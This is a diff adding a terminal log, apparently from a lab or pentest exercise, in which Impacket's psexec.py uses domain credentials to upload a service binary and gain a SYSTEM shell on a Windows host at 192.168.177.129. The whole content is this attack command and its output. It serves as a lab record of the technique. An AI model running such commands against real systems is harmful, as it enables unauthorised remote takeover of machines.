@@ -1,0 +1,25 @@
+
+┌──(root㉿PJZ)-[/home/projectzeus]
+└─# psexec.py SPECTRA.local/dadam:Password1@192.168.177.129
+/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20210704.162046.29ad5792', 'psexec.py')
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.177.129.....
+[*] Found writable share ADMIN$
+[*] Uploading file MNRESITk.exe
+[*] Opening SVCManager on 192.168.177.129.....
+[*] Creating service MfaU on 192.168.177.129.....
+[*] Starting service MfaU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19045.2965]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+DR-ADAM
+
+C:\Windows\system32>
+
